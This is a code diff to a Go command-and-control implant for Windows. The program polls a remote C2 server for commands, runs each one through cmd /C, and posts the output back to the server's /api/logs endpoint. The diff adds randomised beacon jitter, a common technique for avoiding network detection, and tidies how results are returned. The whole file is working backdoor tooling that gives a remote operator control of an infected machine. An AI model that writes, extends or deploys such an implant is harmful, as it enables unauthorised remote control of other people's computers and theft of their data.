@@ -1,13 +1,19 @@
 package main
 
 import (
+	"bytes"
 	"crypto/tls"
 	"fmt"
 	"io"
+	"math/rand/v2"
 	"net/http"
 	"os/exec"
 	"time"
 )
+
+var baseSleep = 5 * time.Second
+var jitterMin = 0.8
+var jitterMax = 1.2
 
 func main() {
 	client := &http.Client{
@@ -32,6 +38,11 @@ func main() {
 		resp.Body.Close()
 
 		cmd := string(cmdData)
+		if cmd == "none" {
+			fmt.Println("[*] No command available")
+			time.Sleep(getJitterSleep())
+			continue
+		}
 		fmt.Println("[*] Received command:", cmd)
 
 		output, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
@@ -39,21 +50,18 @@ func main() {
 			output = append(output, []byte("\n[!] Error: "+err.Error())...)
 		}
 
-		_, err = client.Post(c2URL+"/api/logs", "text/plain",
-			io.NopCloser((io.Reader)(stringReader(output))))
+		res, err := client.Post(c2URL+"/api/logs", "text/plain", bytes.NewReader(output))
 		if err != nil {
 			fmt.Println("[-] Failed to send result:", err)
+		} else {
+			res.Body.Close()
 		}
 
 		time.Sleep(5 * time.Second)
 	}
 }
 
-func stringReader(s []byte) *io.PipeReader {
-	pr, pw := io.Pipe()
-	go func() {
-		pw.Write(s)
-		pw.Close()
-	}()
-	return pr
+func getJitterSleep() time.Duration {
+	factor := jitterMin + rand.Float64()*(jitterMax-jitterMin)
+	return time.Duration(float64(baseSleep) * factor)
 }
